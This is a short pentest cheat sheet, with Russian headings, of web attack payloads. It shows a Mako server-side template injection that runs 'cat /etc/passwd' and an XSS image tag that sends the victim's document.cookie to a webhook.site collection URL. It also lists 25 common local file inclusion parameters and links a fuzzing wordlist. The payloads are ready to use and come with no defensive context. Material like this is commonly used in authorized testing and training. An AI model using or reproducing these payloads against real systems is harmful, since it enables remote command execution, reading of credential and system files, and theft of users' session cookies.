# SSTI (Server-Side Template Injection) в Python

##  Mako Templates
### Проверка уязвимости
${7*7}  # → 49

### Чтение файла
<% import os %>${os.popen('cat /etc/passwd').read()}

# XSS Payload
[<]img src=x onerror="this.src='https://webhook.site/b8ce3f5c-707d-406f-a8df-0dd7928bca42?c='+document.cookie;"[>]

#LFI 
##Top 25 Local File Inclusion (LFI) Parameters

?cat={payload}

?dir={payload}

?action={payload}

?board={payload}

?date={payload}

?detail={payload}

?file={payload}

?download={payload}

?path={payload}

?folder={payload}

?prefix={payload}

?include={payload}

?page={payload}

?inc={payload}

?locate={payload}

?show={payload}

?doc={payload}

?site={payload}

?type={payload}

?view={payload}

?content={payload}

?document={payload}

?layout={payload}

?mod={payload}

?conf={payload}

##  LFI Wordlists
https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
